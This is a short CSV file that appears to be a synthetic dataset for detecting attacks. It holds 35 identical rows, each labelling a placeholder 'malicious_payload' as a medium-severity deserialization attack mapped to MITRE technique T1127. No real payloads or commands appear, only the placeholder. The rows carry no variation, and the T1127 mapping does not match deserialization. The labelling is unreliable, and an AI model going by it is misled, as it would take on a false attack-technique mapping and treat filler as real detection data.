Payload,Signature,AttackType,Severity,MITRE,Label,Description
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
malicious_payload,Deserialization,Deserialization,Medium,T1127,Malicious,Deserialization attack attempt
